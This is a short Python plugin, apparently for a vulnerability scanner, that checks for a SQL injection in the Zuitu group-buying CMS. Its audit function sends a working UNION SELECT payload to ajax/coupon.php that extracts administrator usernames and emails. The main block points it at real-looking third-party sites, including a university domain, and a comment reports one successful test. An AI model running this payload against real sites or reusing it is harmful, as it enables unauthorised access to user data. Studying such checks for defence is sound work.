#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:最土团购SQL Injection
#Refer:http://www.wooyun.org/bugs/wooyun-2010-075525

def assign(service,arg):
    if service=="zuitu":
        return True,arg 
    

def  audit(arg):
    url=arg+"ajax/coupon.php?action=consume&secret=8&id=2%27%29/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat%280x31,0x3a,username,0x3a,md5%2812%29,0x3a,email,0x3a%29,8,9,10,11,9999999999,13,14,15,16/**/from/**/user/**/where/**/manager=0x59/**/limit/**/0,1%23"

    code,head,res,errcode,_=curl.curl2(url)
    
    if code==200 and 'c20ad4d76fe97759aa27a0c99bff6710' in res:
            security_hole(url)

if __name__=="__main__":
    from dummy import *
    #audit(assign('zttgccms','http://tuan.ttysq.com/')[1])（测试成功但是有ip限制）
    audit(assign('zuitu','http://vemcapp45.ctbu.edu.cn/shop/')[1])